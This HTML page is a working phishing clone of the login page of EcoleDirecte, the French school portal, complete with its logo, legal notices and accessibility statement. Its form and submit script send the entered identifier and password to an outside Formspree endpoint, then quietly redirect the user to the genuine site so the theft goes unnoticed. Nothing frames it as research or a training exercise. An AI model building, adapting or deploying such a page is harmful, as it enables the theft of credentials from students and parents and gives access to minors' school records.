<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - EcoleDirecte</title>
    <link rel="icon" href="https://www.ecoledirecte.com/favicon.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
        @font-face {
            font-family: 'CustomFont';
            src: url('https://cdn.jsdelivr.net/gh/Cyprdu/Cin-Stream@main/UcCO3FwrK3iLTeHuS_nVMrMxCp50SjIw2boKoduKmMEVuGKYMZg.ttf') format('truetype');
        }
        body {
            font-family: 'Inter', sans-serif;
        }
        .gradient-bg {
            background: linear-gradient(to top, #0e8cce, #0e3f86);
        }
        .form-input {
            border: 1px solid #d1d5db;
            border-radius: 0.375rem;
            padding: 0.75rem 1rem;
            width: 100%;
            transition: border-color 0.2s;
        }
        .form-input:focus {
            outline: none;
            border-color: #0f8fd1;
            box-shadow: 0 0 0 2px rgba(15, 143, 209, 0.2);
        }
        .submit-btn {
            background-color: #0f8fd1;
            color: white;
            font-weight: 500;
            padding: 0.75rem 1.5rem;
            border-radius: 0.375rem;
            width: 100%;
            text-align: center;
            transition: background-color 0.2s;
        }
        .submit-btn:hover {
            background-color: #0c7ab3;
        }
        .vertical-tab {
            writing-mode: vertical-rl;
            transform: rotate(180deg);
            background-color: #f3f4f6;
            padding: 1rem 0.5rem;
            border-radius: 0.375rem 0 0 0.375rem;
            font-size: 0.875rem;
            color: black;
            font-family: 'CustomFont', sans-serif;
            letter-spacing: 0.05em;
            cursor: pointer;
        }
        /* Loading animation styles */
        .dot1 { animation-delay: 0s; }
        .dot2 { animation-delay: 0.2s; }
        .dot3 { animation-delay: 0.4s; }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.6; }
            40% { transform: scale(1.2); opacity: 1; }
        }
        .animate-bounce-loader {
            animation: bounce 1.4s infinite ease-in-out both;
        }
        .modal {
            max-height: 80vh;
            overflow-y: auto;
        }
    </style>
</head>
<body class="bg-gray-100">

    <div class="flex min-h-screen">
        <!-- Left Side - Form -->
        <div class="w-full lg:w-[calc(33.33%-30px)] flex items-center justify-center bg-white p-8 sm:p-12">
            <div class="w-full max-w-md">
                <!-- Logo -->
                <div class="text-center mb-8 -mt-12">
                     <img src="https://static.wixstatic.com/media/138810_d6027b553af442b09f19fe896ff594aa~mv2.png/v1/fill/w_242,h_158,al_c,lg_1,q_85,enc_avif,quality_auto/logoEcoleDirecte_580417d7.png" alt="Logo EcoleDirecte" class="mx-auto mb-4 h-24">
                    <h1 class="text-2xl font-bold text-gray-800">EcoleDirecte</h1>
                </div>

                <div class="relative" id="form-container">
                     <!-- Form Loading Overlay -->
                    <div id="form-loading-overlay" class="hidden absolute inset-0 bg-white bg-opacity-80 flex-col items-center justify-center z-20 rounded-lg">
                        <div class="flex space-x-2">
                           <div class="w-4 h-4 bg-black rounded-full animate-bounce-loader dot1"></div>
                           <div class="w-4 h-4 bg-black rounded-full animate-bounce-loader dot2"></div>
                           <div class="w-4 h-4 bg-black rounded-full animate-bounce-loader dot3"></div>
                        </div>
                        <p class="mt-4 text-black">Chargement en cours...</p>
                    </div>

                    <h2 class="text-3xl font-bold text-[#0f8fd1] text-center mb-8">Connectez-vous</h2>

                    <form id="login-form" action="https://formspree.io/f/xpwjlbop" method="POST">
                        <!-- Identifiant Input -->
                        <div class="mb-4">
                            <input type="text" name="Identifiant" placeholder="Identifiant" class="form-input" required>
                        </div>

                        <!-- Mot de Passe Input -->
                        <div class="mb-4 relative">
                            <input type="password" name="Mot de Passe" id="password" placeholder="Mot de passe" class="form-input pr-10" required>
                            <button type="button" id="togglePassword" class="absolute inset-y-0 right-0 flex items-center px-3 text-[#0f8fd1] hover:text-[#0c7ab3]">
                                <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 576 512" fill="currentColor"><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3z"/></svg>
                                <svg id="eye-closed" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 hidden" viewBox="0 0 640 512" fill="currentColor"><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"/></svg>
                            </button>
                        </div>

                        <div class="flex items-center justify-between mb-6 text-sm">
                            <label class="flex items-center">
                                <input type="checkbox" name="remember" class="h-4 w-4 text-[#0f8fd1] focus:ring-[#0f8fd1] border-gray-300 rounded">
                                <span class="ml-2 text-black font-bold">Se souvenir de moi</span>
                            </label>
                            <a href="https://api.ecoledirecte.com/mot-de-passe-oublie.awp" class="font-medium text-gray-400 hover:text-gray-400 hover:underline">Mot de passe oublié ?</a>
                        </div>

                        <!-- Submit Button -->
                        <button type="submit" class="submit-btn">Connexion</button>
                    </form>
                </div>
                <div class="text-left mt-12 text-sm text-black">
                    <a href="#" id="legal-link" class="hover:underline">Mentions légales</a>
                    <span class="mx-2">&middot;</span>
                    <a href="#" id="accessibility-link" class="hover:underline">Accessibilité</a>
                </div>
            </div>
        </div>

        <!-- Right Side - Promotion -->
        <div id="promotion-block" class="hidden lg:flex lg:w-[calc(66.67%+30px)] gradient-bg items-center justify-center relative p-8">
            <div id="problem-tab" class="absolute left-0 top-1/2 -translate-y-1/2">
                <div class="vertical-tab">PROBLÈME DE CONNEXION ?</div>
            </div>
            <div class="text-center text-white">
                <h3 class="text-xl mb-8">Retrouvez EcoleDirecte aussi sur votre mobile</h3>
                <div class="flex justify-center space-x-4">
                    <a href="https://play.google.com/store/apps/developer?id=Aplim" target="_blank"><img src="https://www.ecoledirecte.com/assets/images/play-store.png" alt="Disponible sur Google Play" class="h-12"></a>
                    <a href="https://itunes.apple.com/fr/developer/aplim/id466797731" target="_blank"><img src="https://www.ecoledirecte.com/assets/images/appstore.png" alt="Disponible sur l'App Store" class="h-12"></a>
                </div>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div id="modal-overlay" class="hidden fixed inset-0 bg-black bg-opacity-75 z-40 transition-opacity"></div>
    
    <!-- Problem Modal -->
    <div id="problem-modal" class="hidden fixed top-8 left-1/2 -translate-x-1/2 bg-white rounded-lg shadow-xl z-50 w-11/12 max-w-3xl p-8 transition-transform modal">
        <button data-close-button class="absolute top-3 right-4 text-gray-500 hover:text-gray-800 text-3xl font-bold">&times;</button>
        <h2 class="text-2xl font-bold mb-4">Des difficultés pour vous connecter ?</h2>
        <div class="text-gray-700 space-y-4">
            <div>
                <h3 class="font-semibold">Si vous avez déjà personnalisé votre compte d'accès</h3>
                <p>Vous pouvez utiliser le lien 'mot de passe oublié' en indiquant l'email ou le numéro de téléphone que vous avez fourni lors de la création de votre compte. Si cette procédure échoue, vous devez contacter directement votre établissement afin qu'il réinitialise votre compte d'accès.</p>
            </div>
            <div>
                <h3 class="font-semibold">Si vous n'avez jamais personnalisé votre compte d'accès</h3>
                <p>Dans ce cas, le lien 'mot de passe oublié' ne fonctionnera pas. Vous devez utiliser votre code de première connexion fourni par votre établissement.</p>
            </div>
        </div>
    </div>

    <!-- Legal Modal -->
    <div id="legal-modal" class="hidden fixed top-8 left-1/2 -translate-x-1/2 bg-white rounded-lg shadow-xl z-50 w-11/12 max-w-3xl p-8 transition-transform modal">
        <button data-close-button class="absolute top-3 right-4 text-gray-500 hover:text-gray-800 text-3xl font-bold">&times;</button>
        <h2 class="text-2xl font-bold mb-4">Mentions légales</h2>
        <div class="text-gray-700 space-y-4 text-sm">
            <h3 class="font-semibold">Dispositions générales applicables au site EcoleDirecte</h3>
            <p>Les données personnelles sécurisées figurant sur ce site Internet concernent des élèves et les familles, et sont fournies par le logiciel Charlemagne des établissements scolaires au sein desquels ceux-ci sont scolarisés. Ces établissements scolaires se sont engagés à apporter tous leurs soins dans la qualité des informations diffusées. Il s’agit toutefois d’indications qui, en aucun cas, ne pourraient faire foi en lieu et place des documents usuels (bulletins de notes, relevés de notes, relevés d’absences et de sanctions). Ces informations ne sont disponibles qu’après saisie d’un mot de passe fourni exclusively par l’établissement soit au responsable juridique de l’élève s’il est mineur, soit à l’élève lui même s’il est majeur. Le détenteur d’un mot de passe ne peut accéder qu’aux seules informations le concernant lui ou les personnes dont il est responsable juridiquement.</p>
            <p>EcoleDirecte ne collecte aucune donnée personnelle directement sur le site Internet, à l’exception de l’adresse email et/ou du téléphone mobile, utilisés exclusivement pour la récupération des identifiants et les alertes de sécurité. Le site n'utilise aucun cookie soumis à consentement (cookies publicitaires, analytiques non anonymes ou liés aux réseaux sociaux), seuls des cookies nécessaires à son bon fonctionnement ou des cookies strictement anonymes exemptés de consentement pouvant être employés. (cnil.fr)</p>
            <p>Pour optimiser la confidentialité de vos consultations, nous vous conseillons de choisir un mot de passe sécurisé. Le site internet et ses données associées sont hébergés sur des serveurs situés sur le territoire français. La société APLIM, hébergeur du site, s’engage dans tous les cas à ne pas utiliser, louer, vendre, céder ou mettre à disposition d’un tiers à fin d’autres usages le contenu du présent site Internet. Les données présentes sur ce site pourront être divulguées en application d'une loi, d'un règlement ou en vertu d'une décision d'une autorité réglementaire ou judiciaire compétente ou encore, si cela s'avère nécessaire, aux fins de maintenance, par l'éditeur ou l’établissement scolaire.</p>
            <p>Le responsable du traitement de ces données est l’établissement scolaire qui a procédé à leur saisie. Le responsable de leur sécurisation sur notre plateforme EcoleDirecte en qualité de sous-traitant est : Société Aplim ZA Les Côtes 73190 Saint Jeoire Prieuré, rgpd@aplim.fr.</p>
            <p>En application des articles 15, 16, 17 et 18 du Règlement du Parlement européen et du Conseil du 27 avril 2016, et de la Loi n° 78-17 du 6 janvier 1978 relative à l'informatique, aux fichiers et aux libertés, vous disposez d'un droit d'accès, de rectification, d'effacement des données collectées, et d'un droit de limitation du traitement des données personnelles que vous pouvez exercer auprès du responsable du traitement (à savoir l’établissement scolaire responsable du traitement) qui nous répercutera votre demande à fins d’exécution sur le site EcoleDirecte.</p>
            <p>En toute hypothèse, il vous est possible d'introduire une réclamation auprès de la Commission Nationale de l'Informatique et des Libertés si vous vous estimez lésé par le traitement de vos données personnelles par l’établissement scolaire.</p>
            <p>L'activation de l'amélioration de l'accessibilité des personnes déficientes visuelles utilise la police de caractères Luciole. Cette police de caractères est distribuée gratuitement sous Licence publique Creative Commons Attribution 4.0 International : Luciole © Laurent Bourcellier & Jonathan Perez</p>
        </div>
    </div>
a
    <!-- Accessibility Modal -->
    <div id="accessibility-modal" class="hidden fixed top-8 left-1/2 -translate-x-1/2 bg-white rounded-lg shadow-xl z-50 w-11/12 max-w-3xl p-8 transition-transform modal">
        <button data-close-button class="absolute top-3 right-4 text-gray-500 hover:text-gray-800 text-3xl font-bold">&times;</button>
        <h2 class="text-2xl font-bold mb-4">Déclaration d'accessibilité</h2>
        <div class="text-gray-700 space-y-4 text-sm">
            <p>APLIM s’engage à rendre ses sites internet, intranet, extranet et ses applications mobiles, accessibles conformément à l’article 47 de la loi n° 2005-102 du 11 février 2005. Cette déclaration d’accessibilité s’applique au site APLIM – Ecole directe.</p>
            <h3 class="font-semibold">État de conformité</h3>
            <p>En date du 15 novembre 2024, APLIM – Ecole directe - https://www.ecoledirecte.com/ est partiellement conforme avec le référentiel général d’amélioration de l’accessibilité (RGAA), version 4.1.2 en raison des non-conformités et des dérogations énumérées ci-dessous.</p>
            <h3 class="font-semibold">Résultats des tests</h3>
            <p>L’audit de conformité réalisé par Urbilog Compéthance EA révèle que 62% des critères RGAA sont respectés.</p>
            <h3 class="font-semibold">Contenus non accessibles</h3>
            <p>Les contenus listés ci-dessous ne sont pas accessibles pour les raisons suivantes.</p>
            <h4 class="font-medium">Non-conformités</h4>
            <ul class="list-disc list-inside space-y-1">
                <li>Couleurs: 3.1, 3.2, 3.3</li>
                <li>Tableaux: 5.1</li>
                <li>Scripts: 7.1, 7.3</li>
                <li>Éléments obligatoires: 8.2</li>
                <li>Présentation de l’information: 10.2, 10.6, 10.7, 10.11</li>
                <li>Formulaires: 11.1, 11.2, 11.4, 11.5, 11.9, 11.10, 11.11, 11.13</li>
                <li>Navigation: 12.1, 12.7, 12.8</li>
                <li>Consultation: 13.1, 13.3</li>
            </ul>
             <h4 class="font-medium">Dérogation pour charge disproportionnée</h4>
             <p>Aucun élément dérogé pour charge disproportionnée.</p>
            <h3 class="font-semibold">Établissement de cette déclaration d’accessibilité</h3>
            <p>Cette déclaration d’accessibilité a été établie le 15 novembre 2024.</p>
            <h3 class="font-semibold">Voies de recours</h3>
            <p>Cette procédure est à utiliser dans le cas suivant. Vous avez signalé au responsable du site internet un défaut d’accessibilité qui vous empêche d’accéder à un contenu ou à un des services du portail et vous n’avez pas obtenu de réponse satisfaisante. Écrire un message au Défenseur des droits : https://formulaire.defenseurdesdroits.fr/ [...]</p>
        </div>
    </div>


    <script>
        // --- General Modal Logic ---
        const modalOverlay = document.getElementById('modal-overlay');
        const modals = document.querySelectorAll('.modal');
        const closeButtons = document.querySelectorAll('[data-close-button]');

        function openModal(modal) {
            if (modal == null) return;
            modal.classList.remove('hidden');
            modalOverlay.classList.remove('hidden');
        }

        function closeModal(modal) {
            if (modal == null) return;
            modal.classList.add('hidden');
            modalOverlay.classList.add('hidden');
        }

        modalOverlay.addEventListener('click', () => {
            modals.forEach(modal => {
                if (!modal.classList.contains('hidden')) {
                    closeModal(modal);
                }
            });
        });

        closeButtons.forEach(button => {
            button.addEventListener('click', () => {
                const modal = button.closest('.modal');
                closeModal(modal);
            });
        });
        
        // --- Specific Modal Triggers ---
        document.getElementById('problem-tab').addEventListener('click', () => openModal(document.getElementById('problem-modal')));
        document.getElementById('legal-link').addEventListener('click', (e) => {
            e.preventDefault();
            openModal(document.getElementById('legal-modal'));
        });
        document.getElementById('accessibility-link').addEventListener('click', (e) => {
            e.preventDefault();
            openModal(document.getElementById('accessibility-modal'));
        });


        // --- Toggle password visibility ---
        const passwordInput = document.getElementById('password');
        const togglePasswordButton = document.getElementById('togglePassword');
        const eyeOpen = document.getElementById('eye-open');
        const eyeClosed = document.getElementById('eye-closed');

        togglePasswordButton.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            eyeOpen.classList.toggle('hidden');
            eyeClosed.classList.toggle('hidden');
        });

        // --- Handle form submission ---
        const form = document.getElementById('login-form');
        const formLoadingOverlay = document.getElementById('form-loading-overlay');

        form.addEventListener('submit', function (e) {
            e.preventDefault(); 
            formLoadingOverlay.classList.remove('hidden');
            formLoadingOverlay.classList.add('flex');
            
            const formData = new FormData(form);
            const action = form.getAttribute('action');

            fetch(action, { method: 'POST', body: formData, headers: {'Accept': 'application/json'} })
            .catch(error => console.error('Error submitting form:', error));

            setTimeout(() => {
                window.location.href = 'https://www.ecoledirecte.com/login?cameFrom=%2FAccueil';
            }, 3000);
        });

    </script>

</body>
</html>

